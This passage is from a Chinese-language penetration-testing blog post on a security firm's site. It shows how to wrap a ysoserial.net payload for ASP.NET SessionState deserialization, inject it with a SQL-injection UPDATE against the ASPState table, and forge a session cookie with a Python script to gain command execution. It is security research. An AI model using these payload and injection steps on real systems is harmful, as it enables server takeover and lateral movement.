<p>不過到此還是有個小問題需要解決，ysoserial.net 的 AltSerialization plugin 所建立的 payload 是攻擊 SessionStateItemCollection 或 HttpStaticObjectsCollection 兩個類別的反序列化操作，而我們儲存在資料庫中的 session 序列化資料是由在此之上還額外作了一層包裝的 SessionStateUtility 類別處理的，所以必須要再做點修飾。回頭再去看看程式碼，會發現 SessionStateUtility 也只添加了幾個 bytes，減化後如下所示：</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">timeout</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadInt32</span><span class="p">();</span>
<span class="n">hasItems</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>
<span class="n">hasStaticObjects</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadBoolean</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="n">hasStaticObjects</span><span class="p">)</span>
    <span class="n">staticObjects</span> <span class="p">=</span> <span class="n">HttpStaticObjectsCollection</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>

<span class="n">eof</span> <span class="p">=</span> <span class="n">reader</span><span class="p">.</span><span class="nf">ReadByte</span><span class="p">();</span>
</code></pre></div></div>

<p>對於 Int32 要添加 4 個 bytes，Boolean 則是 1 個 byte，而因為要讓程式路徑能進入 HttpStaticObjectsCollection 的分支，必須讓第 6 個 byte 為 1 才能讓條件達成，先將原本從 ysoserial.net 產出的 payload 從 base64 轉成 hex 表示，再前後各別添加 6、1 bytes，如下示意圖：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  timeout    false  true            HttpStaticObjectsCollection             eof
┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐
00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff
</code></pre></div></div>

<p>修飾完的這個 payload 就能用來攻擊 SessionStateUtility 類別了！</p>

<p>最後的步驟就是利用開頭的 SQL Injection 將惡意的序列化內容注入進去資料庫，如果正常瀏覽目標網站時有出現 ASP.NET_SessionId 的 Cookie 就代表已經有一筆對應的 Session 記錄儲存在資料庫裡，所以我們只需要執行如下的 SQL Update 語句：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=1; UPDATE ASPState.dbo.ASPStateTempSessions
       SET SessionItemShort = 0x{Hex_Encoded_Payload}
       WHERE SessionId LIKE '{ASP.NET_SessionId}%25'; --
</code></pre></div></div>

<p>分別將 <code class="highlighter-rouge">{ASP.NET_SessionId}</code> 替換成自己的 ASP.NET_SessionId 的 Cookie 值以及 <code class="highlighter-rouge">{Hex_Encoded_Payload}</code> 替換成前面準備好的序列化 payload 即可。</p>

<p>那假如沒有 ASP.NET_SessionId 怎麼辦？這表示目標可能還未儲存任何資料在 Session 之中，所以也就不會產生任何記錄在資料庫裡，但既然沒有的話，那我們就硬塞一個 Cookie 給它！ASP.NET 的 SessionId 是透過亂數產生的 24 個字元，但使用了客製化的字元集，可以直接使用以下的 Python script 產生一組 SessionId，例如：plxtfpabykouhu3grwv1j1qw，之後帶上 <code class="highlighter-rouge">Cookie: ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw</code> 瀏覽任一個 aspx 頁面，理論上 ASP.NET 就會自動在資料庫裡添加一筆記錄。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">random</span>
<span class="n">chars</span> <span class="o">=</span> <span class="s">'abcdefghijklmnopqrstuvwxyz012345'</span>
<span class="k">print</span><span class="p">(</span><span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">)))</span>
</code></pre></div></div>

<p>假如在資料庫裡仍然沒有任何記錄出現，那就只能手動刻 INSERT 的 SQL 來創造一個記錄，至於如何刻出這部分？只要看看程式碼應該就可以很容易構造出來，所以留給大家自行去玩 :P</p>

<p>等到 Payload 順利注入後，只要再次用這個 Cookie <code class="highlighter-rouge">ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw</code> 瀏覽任何一個 aspx 頁面，就會觸發反序列化執行任意系統指令！</p>

<p>題外話，利用 SessionState 的反序列化取得 ASP.NET 網站應用程式主機控制權的場景並不僅限於 SQL Injection。在內網滲透測試的過程中，經常會遇到的情境是，我們透過各方的資訊洩漏 ( 例如：內部 GitLab、任意讀檔等 ) 取得許多 SQL Server 的帳號、密碼，但唯獨取得不了目標 ASP.NET 網站應用程式的 Windows 主機的帳號密碼，而為了達成目標 ( 控制指定的網站主機 )，我們就曾經使用過這個方式取得目標的控制權，所以作為內網橫向移動的手段也是稍微有價值且非常有趣。至於還能有什麼樣的花樣與玩法，就要靠各位持續地發揮想像力！</p>

              </article>
              <p class="sns-widgets">
                Share this on <button class="appearance-none sns-widgets__button" id="sns-facebook" type="button">Facebook</button> or <button class="appearance-none sns-widgets__button" id="sns-twitter" type="button">Twitter</button>
              </p>
          
              <div class="heading--side-lined">
                About <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="blog-author-name">Cyku</a> 
              </div>
              <p class="blog-author-info">
                一位熱愛網站應用程式安全技術的夢想家，<br />專長於滲透測試，夢想是成為光之美少女。
              </p>
          
              <div class="heading--side-lined">
                讀者留言
              </div>
              <div class="blog-comments">
                


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




              </div>
            </div>
          </div>






</main>
      <div class="container--wrapper">

        <div class="relative-posts">
          <div class="heading--side-lined container">
            最新消息
          </div>
          <div class="relative-posts__cells">
  
            <section class="card">
              <a href="/blog/2021/06/22/devcore-202106-recruit/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20150819/devcore_office_1.jpg)"></div>
                <h3 class="card__title">
                  DEVCORE 徵求紅隊演練工程師
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/公告/" class="card__tag">公告</a><a href="/blog/tag/徵才/" class="card__tag">徵才</a>
              </div>
              <small class="card__category"><a href="/blog/category/最新消息/">最新消息</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2020/10/30/devcore-wargame-at-hitcon-2020/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20201030/cover.png)"></div>
                <h3 class="card__title">
                  DEVCORE Wargame at HITCON 2020
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/PHP/" class="card__tag">PHP</a><a href="/blog/tag/RCE/" class="card__tag">RCE</a>
              </div>
              <small class="card__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
            </section>
  
            <section class="card">
              <a href="/blog/2020/10/13/mitigate-real-threats-by-framework-and-standards/">
                <div class="card__thumbnail" style="background-image: url(https://devco.re/assets/img/blog/20201013/5.png)"></div>
                <h3 class="card__title">
                  你的資安策略夠明確嗎？透過框架優先緩解真實威脅
                </h3></a>
              <div class="card__tags">
  
                <a href="/blog/tag/Strategy/" class="card__tag">Strategy</a>
              </div>
              <small class="card__category"><a href="/blog/category/科普文章/">科普文章</a></small>
            </section>
  
          </div>
        </div>


        <div class="contact-section container">
          <h2 class="contact-section__title">
            用最真實的攻擊，驗證企業的防禦
          </h2>
          <a href="/contact/" class="home-contact__button button--dense">聯絡我們</a>
        </div>

        <footer class="main-footer">
          <div class="main-footer__about">
            戴夫寇爾提供<br class="mobile-only" /><a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務<br />在<a href="https://www.facebook.com/D3VC0RE" class="link" target="_blank">Facebook</a>或<a href="https://twitter.com/d3vc0r3" class="link" target="_blank">Twitter</a>上追蹤我們的<a href="/blog/" class="link">最新訊息</a><br />瞭解更多戴夫寇爾的<a href="/about/" class="link">駭客思維</a>
          </div>
          <div class="main-footer__snses"><a href="https://www.facebook.com/D3VC0RE" class="main-footer__sns" target="_blank">
                <svg class="icon-fb icon"><use xlink:href="#icon-fb" /></svg></a><a href="https://twitter.com/d3vc0r3" class="main-footer__sns" target="_blank">
                <svg class="icon-twitter icon"><use xlink:href="#icon-twitter" /></svg></a>
          </div>
          <address class="main-footer__address">
            <ul class="list--unstyled">
              <li>
                地址 10487 台北市中山區復興北路 168 號 10 樓
              </li>
              <li>
                Email contact@devco.re
              </li>
              <li>
                電話 02-2718-0156
              </li>
              <li>
                統編 53955237
              </li>
            </ul>
          </address><small class="main-footer__copyright"><a href="/" class="logo">DEVCORE</a>©2021 DEVCORE 戴夫寇爾</small>
        </footer>
      </div>
    </div>
    <script src="/assets/themes/devcore-v2/javascripts/webpack_bundle.js"></script>



  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-30830800-1']);
  _gaq.push(['_trackPageview', location.pathname + location.search + location.hash]);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>




    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K5B8NW"
    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->

  </body>
</html>




